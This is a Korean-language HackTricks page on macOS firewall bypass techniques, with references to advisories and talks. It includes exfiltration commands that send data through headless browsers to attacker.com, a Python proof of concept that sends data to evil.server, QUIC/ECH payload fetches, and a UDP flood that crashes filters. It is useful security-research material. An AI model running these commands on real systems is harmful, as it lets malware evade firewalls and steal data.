# macOS 방화벽 우회

{{#include ../../banners/hacktricks-training.md}}

## 발견된 techniques

다음 techniques는 일부 macOS firewall 앱에서 작동하는 것으로 확인되었습니다.

### whitelist 이름 악용

- 예를 들어 **`launchd`**와 같은 잘 알려진 macOS 프로세스 이름으로 malware를 호출

### Synthetic Click

- firewall이 사용자에게 permission을 요청하면 malware가 **allow를 클릭**하도록 만들기

### **Apple signed binaries 사용**

- **`curl`**과 같은 binary뿐만 아니라 **`whois`**와 같은 다른 binary도 사용

### 잘 알려진 Apple domain

firewall은 **`apple.com`** 또는 **`icloud.com`**과 같은 잘 알려진 Apple domain으로의 connection을 허용할 수 있습니다. 또한 iCloud를 C2로 사용할 수도 있습니다.

### Generic Bypass

firewall을 우회하기 위해 시도해 볼 수 있는 몇 가지 아이디어

### 허용된 traffic 확인

허용된 traffic을 파악하면 잠재적으로 whitelist에 등록된 domain이나 access가 허용된 application을 식별하는 데 도움이 됩니다
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS 악용

DNS resolution은 **`mdnsreponder`** 서명된 application을 통해 수행되며, 이 application은 DNS 서버에 연결할 수 있도록 허용되어 있을 가능성이 높습니다.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Browser apps를 통한 방법

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### 프로세스 injection을 통한 우회

**어떤 서버에든 연결할 수 있도록 허용된 프로세스에 code를 injection**할 수 있다면 firewall protections를 우회할 수 있습니다:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## 최근 macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass - **CVE-2024-44206**
2024년 7월 Apple은 Screen Time parental controls에서 사용하는 system-wide “Web content filter”를 무력화하는 Safari/WebKit의 critical bug를 patch했습니다.
특별히 조작된 URI(예: double URL-encoded “://”가 포함된 URI)는 Screen Time ACL에서는 인식되지 않지만 WebKit에서는 허용되므로, 해당 request가 filter되지 않은 상태로 전송됩니다. 따라서 URL을 open할 수 있는 모든 process(sandboxed 또는 unsigned code 포함)는 user 또는 MDM profile에 의해 명시적으로 block된 domain에 도달할 수 있습니다.<sup>[2]</sup>

Practical test (patch되지 않은 system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### 초기 macOS 14 “Sonoma”의 Packet Filter (PF) 규칙 순서 지정 버그
macOS 14 beta cycle 동안 Apple은 **`pfctl`** 주변의 userspace wrapper에 regression을 도입했습니다.
많은 VPN kill-switch에서 사용하는 `quick` keyword와 함께 추가된 규칙이 조용히 무시되어, VPN/firewall GUI에 *blocked*로 표시된 경우에도 traffic leak이 발생했습니다. 이 버그는 여러 VPN vendor에 의해 확인되었으며 RC 2 (build 23A344)에서 수정되었습니다.

빠른 leak 점검:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple-signed helper services 악용 (legacy – macOS 11.2 이전)
macOS 11.2 이전에는 **`ContentFilterExclusionList`**가 **`nsurlsessiond`** 및 App Store와 같은 약 50개의 Apple 바이너리가 Network Extension framework로 구현된 모든 socket-filter firewall (LuLu, Little Snitch 등)을 우회하도록 허용했습니다.
Malware는 단순히 exclusion된 process를 spawn하거나 해당 process에 code를 inject한 뒤, 이미 허용된 socket을 통해 자체 traffic을 tunnel할 수 있었습니다. Apple은 macOS 11.2에서 exclusion list를 완전히 제거했지만, upgrade할 수 없는 시스템에서는 이 technique이 여전히 relevant합니다.<sup>[3]</sup>

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH로 Network Extension 도메인 필터 우회 (macOS 12+)
NEFilter Packet/Data Providers는 TLS ClientHello SNI/ALPN을 기준으로 동작합니다. **HTTP/3 over QUIC (UDP/443)** 및 **Encrypted Client Hello (ECH)**를 사용하면 SNI가 암호화된 상태로 유지되어 NetExt가 해당 flow를 분석할 수 없고, hostname 규칙이 fail-open으로 동작하는 경우가 많습니다. 그 결과 malware는 DNS를 건드리지 않고도 차단된 도메인에 접근할 수 있습니다.<sup>[5]</sup>

최소 PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
QUIC/ECH가 여전히 enabled 상태라면 이는 손쉬운 hostname-filter 우회 경로입니다.

### macOS 15 “Sequoia” Network Extension 불안정성 (2024–2025)
초기 15.0/15.1 빌드에서는 서드파티 **Network Extension** filters(LuLu, Little Snitch, Defender, SentinelOne 등)가 crash합니다. filter가 재시작되면 macOS가 flow rules를 삭제하고 많은 제품이 fail-open으로 동작합니다. 수천 개의 짧은 UDP flows로 filter를 flooding하거나 QUIC/ECH를 강제로 사용하면 crash를 반복적으로 유발할 수 있으며, GUI에는 여전히 firewall이 실행 중이라고 표시되는 동안 C2/exfil을 위한 window가 남을 수 있습니다.<sup>[4]</sup>

Quick reproduction (safe lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## 최신 macOS를 위한 Tooling 팁

1. GUI firewall이 생성하는 현재 PF rules을 확인합니다:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. 이미 *outgoing-network* entitlement를 보유한 binary를 열거합니다 (piggy-backing에 유용):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift에서 자체 Network Extension content filter를 programmatically 등록합니다.
packet을 local socket으로 전달하는 minimal rootless PoC는 Patrick Wardle의 **LuLu** source code에서 확인할 수 있습니다.

## References

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: macOS Firewall 만들기와 분석하기](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass로 차단된 content에 unrestricted access 허용 (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple, Firewall Security를 우회할 수 있었던 macOS 기능 제거 - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [macOS Sequoia Update 후 Cybersecurity Products 작동 중단 - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [bad sites에 대한 macOS connection을 방지하는 데 network protection 사용 - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
